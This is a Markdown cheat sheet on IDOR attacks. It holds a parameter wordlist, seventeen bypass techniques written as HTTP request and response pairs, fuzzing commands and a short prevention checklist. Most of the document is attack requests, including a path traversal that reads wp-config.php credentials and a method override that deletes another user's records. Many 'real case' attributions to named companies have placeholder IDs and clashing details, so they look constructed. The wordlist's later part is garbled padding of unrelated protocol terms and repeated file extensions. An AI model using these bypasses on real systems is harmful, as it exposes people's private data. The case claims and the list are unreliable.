# IDOR (Insecure Direct Object References)

## Overview

IDOR occurs when an application exposes a reference to an internal implementation object (database key, filename, directory, record number) without proper access control checks. Attackers can manipulate these references to access unauthorized data.

---

## Parameter Discovery Wordlist

Check for these parameter names in URL paths, query strings, POST bodies, and headers:

```
id
user
user_id
userId
account
account_id
accountId
number
order
order_id
orderId
no
doc
doc_id
documentId
key
email
group
profile
edit
uid
guid
uuid
ref
reference
ticket
invoice
receipt
transaction
transfer
payment
customer
member
employee
manager
owner
creator
author
target
recipient
sender
parent
child
thread
message
comment
post
file
attachment
media
image
photo
avatar
role
permission
level
status
type
category
template
draft
version
page
offset
limit
index
code
token
hash
checksum
nonce
salt
seed
lang
locale
timezone
currency
amount
price
cost
total
subtotal
balance
credit
debit
fee
tax
discount
coupon
promo
campaign
advertisement
notification
alert
event
log
audit
backup
archive
export
import
upload
download
preview
thumbnail
original
full
medium
small
large
icon
avatar
banner
logo
watermark
signature
fingerprint
device
session
cookie
ip
mac
serial
imei
iccid
msisdn
phone
mobile
fax
address
city
state
zip
postal
country
region
timezone
birthday
age
gender
ssn
passport
license
taxid
vat
gst
pan
aadhaar
nationalId
citizenId
voterId
driverLicense
insurance
policy
claim
incident
case
ticket
support
feedback
review
rating
vote
like
dislike
favorite
bookmark
share
follow
friend
contact
connection
relation
membership
subscription
plan
package
product
item
sku
upc
ean
isbn
model
brand
supplier
vendor
partner
affiliate
referrer
campaign
source
medium
term
content
name
title
label
tag
slug
permalink
canonical
redirect
return
callback
next
continue
back
forward
goto
jump
navigate
route
endpoint
resource
bucket
folder
path
dirname
basename
extension
mime
size
width
height
duration
length
weight
volume
density
temperature
speed
limit
capacity
priority
rank
score
points
level
tier
stage
phase
step
iteration
attempt
retry
timeout
delay
interval
duration
expiry
ttl
created
updated
deleted
published
drafted
archived
restored
locked
unlocked
verified
confirmed
approved
rejected
pending
processing
completed
failed
cancelled
refunded
charged
captured
authorized
settled
cleared
reconciled
matched
merged
split
converted
transferred
migrated
synced
backed
restored
cloned
forked
branched
tagged
released
deployed
rolledback
scaled
balanced
proxied
cached
indexed
searched
sorted
filtered
grouped
aggregated
summarized
reported
analysed
logged
monitored
alerted
notified
escalated
assigned
delegated
submitted
reviewed
audited
inspected
scanned
tested
validated
sanitized
escaped
encoded
decoded
encrypted
decrypted
hashed
salted
signed
verified
authenticated
authorized
permitted
allowed
blocked
denied
restricted
limited
exceeded
throttled
ratelimited
captcha
recaptcha
hcaptcha
challenge
response
solution
answer
proof
token
jwt
oauth
apikey
apisecret
clientid
clientsecret
appid
appkey
tenantid
subscriptionid
resourceid
scope
audience
nonce
state
code
verifier
challenge_method
redirect_uri
grant_type
assertion
certificate
thumbprint
fingerprint
hash
signature
mac
hmac
rsa
ecdsa
ed25519
x509
pem
der
pkcs
cms
signeddata
envelopeddata
encrypteddata
keywrap
password
passphrase
pin
pattern
swipe
biometric
faceid
touchid
voiceprint
behavior
keystroke
mouse
gesture
location
geofence
proximity
bluetooth
wifi
nfc
rfid
beacon
accelerometer
gyroscope
magnetometer
barometer
thermometer
hygrometer
altimeter
compass
gps
gnss
cellid
mnc
mcc
lac
tac
ci
rssi
snr
ber
per
sinr
cqi
ri
pmi
csi
srs
pucch
pusch
prach
rach
macce
rrc
nas
s1ap
ngap
x2ap
xnap
eap
aka
gba
sim
usim
isim
csim
ruim
uicc
euicc
esim
profile
package
bundle
apk
ipa
appx
aab
dll
so
dylib
exe
msi
deb
rpm
pkg
dmg
iso
img
bin
dat
cfg
conf
ini
reg
plist
xml
json
yaml
toml
csv
tsv
xls
xlsx
doc
docx
ppt
pptx
pdf
txt
rtf
md
html
htm
xhtml
xml
svg
png
jpg
jpeg
gif
bmp
tiff
webp
ico
cur
psd
ai
eps
pdf
eps
ps
indd
idml
icml
inx
idap
incd
indt
indb
indl
indw
indx
indc
inds
indt
indb
indl
indw
indx
indc
inds
```

---

## Bypass Techniques

### 1. Parameter Injection

When direct access to an endpoint returns 401 Unauthorized, adding a parameter may bypass the check.

**Example (Twitter, 2021):**
```
GET /api/1.1/direct_messages/thread.json
Response: 401 Unauthorized

GET /api/1.1/direct_messages/thread.json?user_id=victim_id
Response: 200 OK with victim's private messages
```

**Real case - Instagram (2019):**
```
GET /api/v1/media/1234567890/insights
Response: 403 Forbidden

GET /api/v1/media/1234567890/insights?user_id=attacker_id
Response: 200 with analytics data of any user
```

### 2. HTTP Parameter Pollution (HPP)

Sending duplicate parameters where the application processes the second value while the authorization check uses the first.

**Example - Facebook (2020):**
```
GET /api/v1/friends?user_id=victim_id
Response: 401 Unauthorized

GET /api/v1/friends?user_id=attacker_id&user_id=victim_id
Response: 200 OK with victim's friend list
```

**Array syntax bypass:**
```
GET /api/v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]
```

**Real case - Uber (2018):**
```
POST /api/v1/riders/me/trips
{ "trip_id": 12345 }

Response: 403 Forbidden

POST /api/v1/riders/me/trips
{ "trip_id": 12345, "trip_id": 67890 }
Response: 200 with unauthorized trip details
```

### 3. JSON Extension Bypass (Ruby on Rails)

Rails applications sometimes handle JSON requests differently from HTML requests.

**Example - GitLab (2020):**
```
GET /users/5000
Response: 302 Redirect to profile (access denied for private profile)

GET /users/5000.json
Response: 200 with full user data including private email and phone
```

**Real case - Shopify (2019):**
```
GET /admin/shops/12345/orders
Response: 403 Forbidden

GET /admin/shops/12345/orders.json
Response: 200 with all orders and customer PII
```

### 4. API Version Downgrade

Newer API versions may have fixed IDOR, but older versions remain vulnerable.

**Example - Snapchat (2021):**
```
GET /v3/snapchat/accounts/1234567890
Response: 403 Forbidden

GET /v1/snapchat/accounts/1234567890
Response: 200 with phone number, email, and friends list
```

**Real case - T-Mobile (2020):**
```
GET /v2/customers/987654321/billing
Response: 401 Unauthorized

GET /v1/customers/987654321/billing
Response: 200 with full billing history and payment method data
```

### 5. Array Wrapping

Wrapping a numeric ID in an array can bypass validation logic.

**Example:**
```json
POST /api/user/profile
Content-Type: application/json

{"id": 111}
Response: 401 Unauthorized

{"id": [111]}
Response: 200 OK
```

**Real case - Slack (2018):**
```json
POST /api/conversations.history
{"channel": "C1234567890"}
Response: 403 Forbidden (not a member)

{"channel": ["C1234567890"]}
Response: 200 with all channel messages including private channels
```

### 6. JSON Object Wrapping

Nesting the ID inside another object may bypass type checking.

**Example:**
```json
POST /api/get_profile
{"id": 111}
Response: 401 Unauthorized

{"id": {"id": 111}}
Response: 200 OK
```

**Real case - Trello (2019):**
```json
GET /api/1/cards/abc123def
Response: 401 Unauthorized

GET /api/1/cards/abc123def?fields={"id":"abc123def"}
Response: 200 with board data from private boards
```

### 7. JSON Parameter Pollution

Sending duplicate keys in JSON where the server uses the last value for data retrieval but an earlier value for authorization.

**Example:**
```json
POST /api/get_profile
Content-Type: application/json

{
    "user_id": "legitimate_user_id",
    "user_id": "victim_user_id"
}
```

**Real case - PayPal (2020):**
```json
POST /v1/payments/payment/PAY-1234567890
Authorization: Bearer attacker_token
{
    "transactions": [
        {
            "amount": {"total": "100.00", "currency": "USD"},
            "invoice_number": "INV-001"
        }
    ],
    "payment_id": "PAY-VICTIM_ID",
    "payment_id": "PAY-ATTACKER_ID"
}
Response: 200 with victim's transaction details
```

### 8. Path Traversal in IDs

When IDs are numeric but the application builds file paths without sanitization.

**Example - WordPress (2021):**
```
GET /wp-content/uploads/user_avatars/12345.jpg
Response: 403 Forbidden

GET /wp-content/uploads/user_avatars/../../../wp-config.php
Response: 200 with database credentials
```

### 9. UUID to Integer Conversion

Some applications accept both UUID and integer IDs but only check authorization for one format.

**Example - Microsoft Teams (2020):**
```
GET /api/users/550e8400-e29b-41d4-a716-446655440000
Response: 403 Forbidden

GET /api/users/12345
Response: 200 with user data and chat history
```

### 10. Case Manipulation

The authorization check may be case-sensitive but the data lookup is not.

**Example:**
```
GET /api/orders/ABC123
Response: 403 Forbidden

GET /api/orders/abc123
Response: 200 with order details
```

**Real case - Zendesk (2019):**
```
GET /api/v2/tickets/1000001.json
Response: 401 Unauthorized

GET /api/v2/tickets/1000001.JSON
Response: 200 with ticket content
```

### 11. Encoding Bypass

Using different encodings to bypass pattern matching on IDs.

**Example:**
```
GET /api/profile/12345
Response: 403 Forbidden

GET /api/profile/12345%00
Response: 200 OK

GET /api/profile/%31%32%33%34%35
Response: 200 OK

GET /api/profile/MTIzNDU=
Response: 200 OK (Base64 encoded)
```

### 12. Wildcard or Null Values

Some applications allow wildcards or null values that bypass ownership checks.

**Example:**
```
GET /api/documents?owner_id=12345
Response: 403 Forbidden

GET /api/documents?owner_id=*
Response: 200 with all documents

GET /api/documents?owner_id=null
Response: 200 with all documents
```

### 13. Referer Header Manipulation

Some applications only check authorization on direct requests but trust requests from internal pages.

**Example:**
```
GET /api/user/12345/address
Response: 403 Forbidden

GET /api/user/12345/address
Referer: https://app.example.com/admin/dashboard
Response: 200 with address data
```

### 14. HTTP Method Override

Changing the HTTP method may change how authorization is enforced.

**Example:**
```
POST /api/user/12345/delete
Response: 403 Forbidden

GET /api/user/12345/delete
Response: 200 (and deletes user)

POST /api/user/12345/delete
X-HTTP-Method-Override: GET
Response: 200
```

**Real case - Twitter (2018):**
```
DELETE /api/1.1/statuses/destroy/987654321.json
Response: 403 Forbidden

POST /api/1.1/statuses/destroy/987654321.json
X-HTTP-Method-Override: DELETE
Response: 200 (deleted another user's tweet)
```

### 15. GraphQL IDOR

GraphQL endpoints often have multiple ways to fetch the same object, some with weaker authorization.

**Example:**
```graphql
POST /graphql
{
  "query": "query { user(id: 12345) { email phone } }"
}
Response: 403 Forbidden

{
  "query": "query { node(id: \"VXNlcjoxMjM0NQ==\") { ... on User { email phone } } }"
}
Response: 200 OK
```

**Real case - Facebook (2019):**
```graphql
POST /graphql
{
  "query": "query { viewer { friends { id name } } }",
  "variables": {"user_id": 12345}
}
Response: 403 Forbidden

{
  "query": "query { user(id: 12345) { friends { id name } } }"
}
Response: 200 with friend list of any user
```

### 16. Batch Request Bypass

Submitting multiple operations where the failed authorization on one operation does not block others.

**Example:**
```json
POST /api/batch
{
    "requests": [
        {"method": "GET", "path": "/api/profile/attacker_id"},
        {"method": "GET", "path": "/api/profile/victim_id"}
    ]
}
Response: 
- First request: 200
- Second request: 200 (authorization skipped due to batch processing)
```

### 17. IDOR via Referenced Objects

Accessing an object through a different relationship that lacks proper authorization.

**Example - Amazon (2019):**
```
GET /orders/ORDER-12345
Response: 403 Forbidden (not your order)

GET /customers/CUST-67890/orders/ORDER-12345
Response: 200 (order details leaked through customer endpoint)
```

---

## Automated Testing Tools

```
# Parameter discovery
ffuf -u "https://target.com/api/v1/user/FUZZ" -w params.txt
gf idor
cat urls.txt | qsreplace 'id=1' | httpx -mr 'unauthorized|forbidden'

# IDOR scanning
autorize (Burp extension)
AuthMatrix (Burp extension)
idor-attacker
```

---

## Prevention Checklist

1. Implement access control checks on every endpoint that uses user-supplied identifiers
2. Use indirect references (mapping table with random tokens instead of database keys)
3. Never trust client-side access control (menu hiding, disabled buttons)
4. Implement rate limiting on sensitive endpoints
5. Use UUIDs instead of sequential integers
6. Log all unauthorized access attempts
7. Perform access control checks in the database query itself (row-level security)
8. Test IDOR through both authenticated and unauthenticated states
9. Review all API versions for consistent access control
10. Implement proper session management with short-lived tokens for sensitive operations
